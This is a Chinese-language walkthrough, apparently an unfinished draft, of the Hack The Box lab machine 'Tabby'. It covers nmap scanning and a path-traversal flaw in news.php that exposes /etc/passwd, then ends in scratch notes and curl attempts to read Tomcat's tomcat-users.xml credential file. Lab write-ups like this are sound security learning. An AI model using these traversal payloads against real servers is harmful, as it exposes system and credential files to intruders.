# 免责声明
>本文渗透的主机经过合法授权。本文使用的工具和方法仅限学习交流使用，请不要将文中使用的工具和渗透思路用于任何非法用途，对此产生的一切后果，本人不承担任何责任，也不对造成的任何误用或损害负责

# 服务探测
查看开启端口
```
┌──(root💀kali)-[~/htb/Tabby]
└─# nmap -p- 10.10.10.194 --open                                                   
Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-30 04:22 EST
Nmap scan report for 10.10.10.194
Host is up (0.25s latency).
Not shown: 64733 closed ports, 799 filtered ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 249.82 seconds

```

端口详细信息
```
┌──(root💀kali)-[~/htb/Tabby]
└─# nmap -sV -T4  -A -O 10.10.10.194 -p 22,80,8080                                 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-30 04:33 EST
Nmap scan report for 10.10.10.194
Host is up (0.29s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 45:3c:34:14:35:56:23:95:d6:83:4e:26:de:c6:5b:d9 (RSA)
|   256 89:79:3a:9c:88:b0:5c:ce:4b:79:b1:02:23:4b:44:a6 (ECDSA)
|_  256 1e:e7:b9:55:dd:25:8f:72:56:e8:8e:65:d5:19:b0:8d (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Mega Hosting
8080/tcp open  http    Apache Tomcat
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Apache Tomcat
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.15 - 5.6 (95%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.3 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 8080/tcp)
HOP RTT       ADDRESS
1   292.67 ms 10.10.14.1
2   293.43 ms 10.10.10.194

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.08 seconds

```

有两个http服务,80是apache，8080是tomcat

## 80端口

80端口打开以后，在```NEWS```栏发现导航到了```http://megahosting.htb/news.php?file=statement"```

把```megahosting.htb```添加到本地host文件

```echo "10.10.10.194 megahosting.htb" >> /etc/hosts```

```NEWS```网页显示:
> We apologise to all our customers for the previous data breach.
> We have changed the site to remove this tool, and have invested heavily in more secure servers

曾经发生过信息泄露，哦？

留意到url里file这个参数，貌似是一个文件名，输入```http://megahosting.htb/news.php?file=../../../../../etc/passwd```

成功回显靶机```/etc/passwd```内容，证明存在LFI

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
tomcat:x:997:997::/opt/tomcat:/bin/false
mysql:x:112:120:MySQL Server,,,:/nonexistent:/bin/false
ash:x:1000:1000:clive:/home/ash:/bin/bash
```

存在一个普通用户```ash```

对于不存在，或者没有权限的文件，页面不会有任何返回。

## 8080端口服务

在8080端口首页，暴露出了一些信息，结合80端口的LFI，也许能搞点事情

```
It works !

If you're seeing this page via a web browser, it means you've setup Tomcat successfully. Congratulations!

This is the default Tomcat home page. It can be found on the local filesystem at: /var/lib/tomcat9/webapps/ROOT/index.html

Tomcat veterans might be pleased to learn that this system instance of Tomcat is installed with CATALINA_HOME in /usr/share/tomcat9 and CATALINA_BASE in /var/lib/tomcat9, following the rules from /usr/share/doc/tomcat9-common/RUNNING.txt.gz.

You might consider installing the following packages, if you haven't already done so:

tomcat9-docs: This package installs a web application that allows to browse the Tomcat 9 documentation locally. Once installed, you can access it by clicking here.

tomcat9-examples: This package installs a web application that allows to access the Tomcat 9 Servlet and JSP examples. Once installed, you can access it by clicking here.

tomcat9-admin: This package installs two web applications that can help managing this Tomcat instance. Once installed, you can access the manager webapp and the host-manager webapp.

NOTE: For security reasons, using the manager webapp is restricted to users with role "manager-gui". The host-manager webapp is restricted to users with role "admin-gui". Users are defined in /etc/tomcat9/tomcat-users.xml.
```

暴露出来网页根目录的路径:```/var/lib/tomcat9/webapps/ROOT/```


```http://10.10.10.194:8080/docs/```显示tomcat版本是```Version 9.0.31```



显示管理用户配置文件在```/etc/tomcat9/tomcat-users.xml```,但是无法显示


在本机搭建了一个同样版本的tomcat，资源在[这里](https://archive.apache.org/dist/tomcat/tomcat-9/v9.0.31/bin/apache-tomcat-9.0.31.tar.gz)

查看目录结构
```
┌──(root💀kali)-[~/htb/Tabby/apache-tomcat-9.0.31]
└─# ls
bin           conf             lib      logs    README.md      RUNNING.txt  webapps
BUILDING.txt  CONTRIBUTING.md  LICENSE  NOTICE  RELEASE-NOTES  temp         work

```

conf
```
┌──(root💀kali)-[~/htb/Tabby/apache-tomcat-9.0.31/conf]
└─# ls
Catalina         catalina.properties  jaspic-providers.xml  logging.properties  tomcat-users.xml  web.xml
catalina.policy  context.xml          jaspic-providers.xsd  server.xml          tomcat-users.xsd

```


conf文件夹应该跟```webapps```在同一级，但是浏览器上一直无法回显。。。






<role rolename="manager-gui"/>
<user username="tomcat" password="tomcat" roles="manager-gui"/>

<role rolename="admin-gui"/>
<user username="tomcat" password="tomcat" roles="admin-gui"/>



CATALINA_HOME in /usr/share/tomcat9 and CATALINA_BASE in /var/lib/tomcat9

/var/lib/tomcat9/conf/server.xml



https://downloads.apache.org/tomcat/tomcat-9/v9.0.31/bin/apache-tomcat-9.0.31.tar.gz


/usr/share/tomcat9/conf/tomcat-users.xml

echo 'xxxx  '| curl -X POST -H 'Content-type:text/xml' -d @-  http://10.10.10.194/news.php?file=../../../../../var/lib/tomcat9/conf/tomcat-users.xml

cat 1.xml | curl -X GET -H 'Content-type:text/xml'  http://10.10.10.194/news.php?file=../../../../../var/lib/tomcat9/conf/tomcat-users.xml

curl http://10.10.10.194/news.php?file=../../../../../var/lib/tomcat9/conf/tomcat-users.xml -H "Accept: application/xml" 